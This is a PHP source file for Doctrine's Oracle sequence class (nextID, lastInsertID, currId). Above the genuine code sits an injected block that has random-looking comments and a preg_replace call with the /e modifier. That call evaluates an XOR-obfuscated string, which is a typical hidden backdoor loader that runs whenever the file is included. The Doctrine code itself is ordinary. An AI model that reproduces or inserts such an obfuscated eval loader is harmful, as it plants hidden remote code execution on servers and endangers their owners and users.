<?php
/*WJpFLZpNvp7csgWb9W3Q31dj31GDN53jChpO7Ubq0XIr4fH
=HtzkSrZYumSlLVH2jDKAuJX31QW9GN8N7wyNcNmM15xAP6
9BysKKjAa69hH6vDqiQIv4UlwHlABdz=emrpxPpNKmuSge
CmUyeoYQv=RxcGw7tdkftPs42cLX8gj0I4
hJ4RJKDlR1h=TGeBWM6MpFklmIjuBVWifP1oa5Prtwq
*/
//X9bBCAnoJLYKhutB=iqZb6GKqwMi7PwTMM
preg_replace("/N85WIRgqBPsBxXbOShY0Sl/e", "DCXsor5uPcNkJtL9qRtNVR39DPCNAfLDhiwLPq7eIIER3PPhh0v3QnzT33h4Ws75QsEgX=AfIExAUCh2ASsQ7hjxYGpvzlpETulrulM3q03=AZ1BsiRnE2ad8FOvr41=mbqVC3Ns2Fr3fh4MEK1JBQn0V2uCujCWAtrCl6ubAbTf9MsCWhL"^"\x2159\x1fGP\x5c\x13x\x0a=\x18\x2f\x00de\x2dv\x2b\x1c\x13\x03f\x7c\x17\x04\x18i\x22\x0ek\x19AIQjpYZ\x01\x7ca\x19\x0e\x17\x0f\x02\x2d9e3\x60\x055\x5d7\x5b\x145\x1dwN\x0a\x15v\x17p\x03i\x0fsWy\x23\x40r\x60z\x0d\x0a\x25f\x12g\x01XX\x1bnt\x11B\x19UC\x21mRERSJmZ\x02CVIi\x06mf\x2c\x3b\x17\x3f\x10w20ca\x3f\x1e\x02kRR\x09\x07V\x0bj\x1an\x08\x12\x23\x04R\x0a\x40h\x11a\x14c\x0f\x13\x04\x2bc\x02iR3\x1d\x1a\x1c4\x2e\x10\x17d1\x1fNB\x24\x1a=\x12\x11dHc\x2aJe", "N85WIRgqBPsBxXbOShY0Sl");?><?php
/*
 *  $Id: Oracle.php 7490 2010-03-29 19:53:27Z jwage $
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
 * SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
 * LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
 * OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 * This software consists of voluntary contributions made by many individuals
 * and is licensed under the LGPL. For more information, see
 * <http://www.doctrine-project.org>.
 */

/**
 * Doctrine_Sequence_Oracle
 *
 * @package     Doctrine
 * @subpackage  Sequence
 * @author      Konsta Vesterinen <kvesteri@cc.hut.fi>
 * @license     http://www.opensource.org/licenses/lgpl-license.php LGPL
 * @link        www.doctrine-project.org
 * @since       1.0
 * @version     $Revision: 7490 $
 */
class Doctrine_Sequence_Oracle extends Doctrine_Sequence
{
    /**
     * Returns the next free id of a sequence
     *
     * @param string $seqName   name of the sequence
     * @param bool onDemand     when true missing sequences are automatic created
     *
     * @return integer          next id in the given sequence
     */
    public function nextID($seqName, $onDemand = true)
    {
        $sequenceName = $this->conn->quoteIdentifier($this->conn->formatter->getSequenceName($seqName), true);
        $query = 'SELECT ' . $sequenceName . '.nextval FROM DUAL';

        try {
            $result = $this->conn->fetchOne($query);
        } catch(Doctrine_Connection_Exception $e) {
            if ($onDemand && $e->getPortableCode() == Doctrine_Core::ERR_NOSUCHTABLE) {
                try {
                    $result = $this->conn->export->createSequence($seqName);
                } catch(Doctrine_Exception $e) {
                    throw new Doctrine_Sequence_Exception('on demand sequence ' . $seqName . ' could not be created');
                }

                return $this->nextId($seqName, false);
            } else {
                throw new Doctrine_Sequence_Exception('sequence ' .$seqName . ' does not exist');
            }
        }

        return $result;
    }

    /**
     * Returns the autoincrement ID if supported or $id or fetches the current
     * ID in a sequence called: $table.(empty($field) ? '' : '_'.$field)
     *
     * @param   string  name of the table into which a new row was inserted
     * @param   string  name of the field into which a new row was inserted
     */
    public function lastInsertID($table = null, $field = null)
    {
        $seqName = $table . (empty($field) ? '' : '_'.$field);
        $sequenceName =  $this->conn->quoteIdentifier($this->conn->formatter->getSequenceName($seqName), true);

        return $this->conn->fetchOne('SELECT ' . $sequenceName . '.currval FROM DUAL');
    }

    /**
     * Returns the current id of a sequence
     *
     * @param string $seqName   name of the sequence
     *
     * @return integer          current id in the given sequence
     */
    public function currId($seqName)
    {
        $sequenceName = $this->conn->quoteIdentifier($this->conn->formatter->getSequenceName($seqName), true);
        $query   = 'SELECT (last_number-1) FROM user_sequences';
        $query  .= ' WHERE sequence_name=' . $this->conn->quote($sequenceName, 'text');
        $query  .= ' OR sequence_name=' . $this->conn->quote(strtoupper($sequenceName), 'text');

        return $this->conn->fetchOne($query);
    }
}
